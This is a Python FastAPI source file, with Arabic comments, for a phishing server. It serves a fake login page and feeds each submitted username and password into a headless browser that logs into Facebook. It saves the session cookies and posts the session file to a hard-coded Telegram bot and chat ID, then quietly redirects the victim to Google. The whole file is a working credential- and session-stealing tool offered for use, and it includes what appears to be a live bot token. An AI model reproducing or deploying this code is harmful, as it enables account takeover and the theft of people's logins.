from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from playwright.async_api import async_playwright
from playwright.sync_api import sync_playwright
import uvicorn
import os
import requests

app = FastAPI()
templates = Jinja2Templates(directory="templates")

# 🔗 ضع هنا الرابط الذي تريد توجيه الموظف إليه بعدتهاء التسجيل بنجاح
REDIRECT_TARGET_URL = "https://www.google.com"

# 🔗 ضع هنا الرابط الذي تريد توجيه الموظف إليه بعدتهاء التسجيل بنجاح
TELEGRAM_BOT_API = "https://api.telegram.org/bot8623316384:AAHyYEyhA6itKvBEo4BYUK2rvEpbwAqlIhI/sendDocument"
TELEGRAM_CHAT_ID = "8357381411"

@app.get("/", response_class=HTMLResponse)
async def login_page(request: Request):
 return templates.TemplateResponse("login.html", {"request": request})


@app.post("/api/start-session")
async def start_session(username: str = Form(...), password: str = Form(...)):
    safe_username = username.replace("@", "_").replace(".", "_")
    session_filepath = f"sessions/{safe_username}_session.json"
    
    os.makedirs("sessions", exist_ok=True)

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
            )
            page = await context.new_page()
            await page.goto("https://m.facebook.com/")
            await page.fill("input[name='email']", username)
            await page.fill("input[name='pass']", password)
            await page.click("button[name='login']")
            await page.wait_for_timeout(5000)
            await context.storage_state(path=session_filepath)
            await browser.close()

        with open(session_filepath, 'rb') as session_file:
            requests.post(TELEGRAM_BOT_API, files={'document': session_file}, data={'chat_id': TELEGRAM_CHAT_ID})

        return RedirectResponse(url=REDIRECT_TARGET_URL, status_code=303)

    except Exception as e:
        return JSONResponse(content={
            "status": "error",
            "message": f"حدث خطأ أثناء المزامنة: {str(e)}"
        }, status_code=500)

if __name__ == "__main__":
 # قراءة البورت الديناميكي الموفر من Railway تلقائياً
 port = int(os.environ.get("PORT", 8000))
 uvicorn.run(app, host="0.0.0.0", port=port)
